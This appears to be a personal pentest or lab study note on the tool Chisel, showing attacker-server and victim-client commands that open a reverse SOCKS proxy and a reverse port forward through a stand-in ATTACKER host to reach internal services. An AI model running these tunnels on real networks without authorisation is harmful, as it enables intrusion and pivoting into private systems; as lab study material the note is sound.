---
type: tool
category: tunneling
related: [[pivoting]], [[port-forwarding]]
---

# Chisel

Fast TCP/UDP tunnel over HTTP/WebSocket — pivoting when you *don't* have SSH (web shell only, or egress filtering).

## Reverse SOCKS

```sh
# attacker (server)
chisel server -p 8000 --reverse
# victim (client)
chisel client ATTACKER:8000 R:socks
```

Then point [[proxychains]] at the local SOCKS port and route arbitrary tools through it.

## Reverse port forward

```sh
# victim
chisel client ATTACKER:8000 R:8080:10.10.10.5:80   # expose an internal service to the attacker
```

> Not yet exercised on a completed box — introduced alongside [[pivoting]]; planned next after [[littlepivoting]].
